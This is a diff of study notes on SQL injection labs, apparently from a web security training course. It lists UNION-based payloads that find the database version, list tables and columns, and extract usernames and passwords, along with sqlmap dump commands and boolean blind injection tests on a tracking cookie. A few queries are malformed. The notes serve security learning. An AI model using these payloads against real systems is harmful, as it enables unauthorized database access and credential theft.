@@ -101,9 +101,13 @@ To solve the lab, display the database version string.
  **Solution:**
 
 `Pets' UNION SELECT NULL FROM information_schema.tables-- -`
+
 `Pets' UNION SELECT NULL,NULL FROM information_schema.tables-- -`
+
 `Pets' UNION SELECT 'abc',NULL FROM information_schema.tables-- -`
+
 `Pets' UNION SELECT 123,NULL FROM information_schema.tables-- -`
+
 `Pets' UNION SELECT @@version,NULL FROM information_schema.tables-- -`
 
 
@@ -121,14 +125,19 @@ To solve the lab, log in as the `administrator` user.
 **Solution:**
 
 `Corporate+gifts' UNION SELECT NULL FROM dual-- -`
+
 `Corporate+gifts' UNION SELECT NULL FROM information_schema.tables-- -`
+
 `Corporate+gifts' UNION SELECT NULL,NULL FROM information_schema.tables-- -`
 
 `Corporate+gifts' UNION SELECT 'abc',NULL FROM information_schema.tables-- -`
+
 `Corporate+gifts' UNION SELECT 'abc','def' FROM information_schema.tables-- -`
 
 `Corporate+gifts' UNION SELECT 'abc',NULL FROM information_schema.tables-- -`
+
 `Corporate+gifts' UNION SELECT table_name,NULL FROM information_schema.tables-- -`
+
 `Corporate+gifts' UNION SELECT information_schema.columns,NULL FROM pg_user-- -`
 
 `Corporate+gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_owyiqh'-- -`
@@ -154,18 +163,24 @@ You make the `' OR 1=1-- -`
 
 First thing you want to search with this is the Type and Version of Database.
 	`Gift' UNION SELECT NULL FROM dual-- -`
+	
 	`Gift' UNION SELECT NULL,NULL FROM dual-- -`
+	
 	`Gifts' UNION SELECT BANNER,NULL FROM v$version-- -`
 
 Second Thing you want to get the name of database.
+
 	`Gift' UNION SELECT table_name,NULL FROM all_tables-- -`
 
 Third Thing you want to search about the names of columns for the table that content the users
+
 	`Gift' UNION SELECT * FROM all_tab_columns WHERE table_name = 'USERS_GKUGOE'-- -`
+	
 	`Gift' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_GKUGOE'-- -`
 
 Last Thing You got all users data.
 	`Gift' UNION SELECT USERNAME_ELKYDN,PASSWORD_FPNEVM FROM USERS_GKUGOE-- -`
+	
 	`Gift' UNION SELECT USERNAME_ELKYDN,PASSWORD_FPNEVM FROM USERS_GKUGOE WHERE USERNAME_ELKYDN='administrator'-- -`
 
 ---
@@ -201,12 +216,19 @@ You make the `' OR 1=1-- -`
 First thing you want to search with this is the Type and Version of Database.
 To know the number of NULL you can do the :
 		`Pets' UNION SELECT NULL FROM dual-- -`
+		
 		`Pets' UNION SELECT NULL,NULL FROM dual-- -`
+		
 		`Pets' UNION SELECT NULL,NULL,NULL FROM dual-- -`
+		
 		`Pets' UNION SELECT NULL,NULL,NULL,NULL FROM dual-- -`
+		
 		`Pets' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM dual-- -`
+		
 		`Pets' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM dual-- -`
+		
 		`Pets' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM dual-- -`
+		
 		`Pets' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM dual-- -``
 Or you can use this method just increase the number.
 		`Pets' UNION ORDER BY 2-- -`
@@ -214,17 +236,19 @@ Or you can use this method just increase the number.
 Or you can use the Best way Use the SQLMap tool 
 	1. First use the Burp suite to get the request that have the parameter that have the SQL injection and with right click **Save Item** to use it with SQL Map.
 	2. command with SQL Map `python3 sqlmap.py -r fileyousave -p category`
-1. 
+1
 	![](assets/Pasted%20image%2020251010023250.png)
-	3.
+	
 	3.dump database `python3 sqlmap.py -r fileyousave -D public --tables!`
 	
 	![](assets/Pasted%20image%2020251010023648.png)
+	
 	![](assets/Pasted%20image%2020251010023710.png)
 
 	4. get the tables name `python3 sqlmap.py -r fileyousave -D public `
 
 ![](assets/Pasted%20image%2020251010023612.png)
+
 ![](assets/Pasted%20image%2020251010023758.png)
 
 Pets' UNION SELECT NULL,(CHR(113)||CHR(120)||CHR(112)||CHR(122)||CHR(113))||(CHR(114)||CHR(78)||CHR(116)||CHR(70)||CHR(105)||CHR(65)||CHR(71)||CHR(86)||CHR(81)||CHR(113)||CHR(101)||CHR(97)||CHR(78)||CHR(104)||CHR(86)||CHR(67)||CHR(87)||CHR(112)||CHR(105)||CHR(73)||CHR(103)||CHR(122)||CHR(102)||CHR(65)||CHR(105)||CHR(78)||CHR(86)||CHR(67)||CHR(85)||CHR(90)||CHR(104)||CHR(103)||CHR(82)||CHR(72)||CHR(105)||CHR(121)||CHR(117)||CHR(107)||CHR(118)||CHR(108))||(CHR(113)||CHR(120)||CHR(106)||CHR(107)||CHR(113)),NULL FROM information_schema.columns WHERE table_name = 'products'-- 0x11
@@ -248,6 +272,7 @@ Gifts' UNION ALL SELECT NULL,(CHR(113)||CHR(113)||CHR(112)||CHR(112)||CHR(113))|
 
 It give me this Payload I took it and replace this with 
 	`Gifts' UNION ALL SELECT NULL,NULL,NULL-- 0x11
+	
 	`Gifts' UNION ALL SELECT NULL,'6yqrMC',NULL-- 0x11`
 
 
@@ -334,7 +359,9 @@ To solve the lab, log in as the `administrator` user.
 	  ```
 	  
 	- `TrackingId=Vfnb2EsFrcwE4KWg' OR '1'=2`
+	
 	- `TrackingId=Vfnb2EsFrcwE4KWg'AND '1'=1`
+	
 	- `TrackingId=Vfnb2EsFrcwE4KWg' AND '1'=2`
 
 	![](assets/Pasted%20image%2020251010204336.png)
